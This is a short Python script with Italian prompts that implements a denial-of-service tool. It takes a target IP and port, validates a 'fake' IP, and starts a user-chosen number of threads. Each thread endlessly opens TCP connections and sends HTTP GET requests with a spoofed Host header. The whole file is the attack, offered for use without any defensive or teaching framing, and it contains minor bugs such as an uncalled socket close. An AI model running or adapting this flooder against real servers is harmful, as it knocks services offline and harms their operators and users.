from concurrent.futures import thread
import socket
import re
import threading

regex = "^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"

while True:
    target=input("Inserisci l'IP del bersaglio ")
    if(re.search(regex, target)):
        print("IP valido")
        break
    else:
        print("IP non valido")

while True:
    fake_ip=input("Inserisci un IP fasullo ")
    if(re.search(regex, fake_ip)):
        print("IP valido")
        break
    else:
        print("IP non valido")

port=int(input("Inserisci la porta "))
union=(target,port)

def DosAttack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(union)
        s.sendto(("GET /" +target+" HTTP/1.1\r\n").encode("ascii"), union)
        s.sendto(("Host: "+fake_ip+"\r\n\r\n").encode("ascii"), union)
        s.close

for i in range(int(input('inserisci il numero i richieste da fare in parallelo'))):
    thread=threading.Thread(target=DosAttack)
    thread.start()
